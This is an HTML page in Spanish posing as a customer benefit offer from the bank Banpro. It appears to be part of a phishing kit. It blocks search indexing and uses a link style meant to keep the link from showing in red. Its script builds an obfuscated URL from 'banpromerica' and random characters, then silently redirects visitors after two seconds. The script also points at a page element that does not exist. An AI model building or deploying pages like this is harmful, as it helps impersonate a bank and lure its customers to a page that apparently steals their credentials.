<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banpro - Beneficio para clientes</title>
    <style>
        /* Estilo para que el enlace no se muestre en rojo */
        a {
            color: inherit;
            text-decoration: none;
        }
    </style>
</head>
<body>
   

    <script>
        // Ofuscación básica del link
        const baseUrl = "banpromerica";
        const extension = "xbcvbxbcvbkdsbvksdbvbsjkvbjsbdjvbjsdbvjbsjdvbjsdbvjsbdbjbvjds";
        const url = `${baseUrl}${extension}.html`;

        // Redireccionar después de 2 segundos
        setTimeout(function() {
            window.location.href = url;
        }, 2000);

        // Asignar el link al ancla manualmente
        document.getElementById("link").href = url;
    </script>
</body>
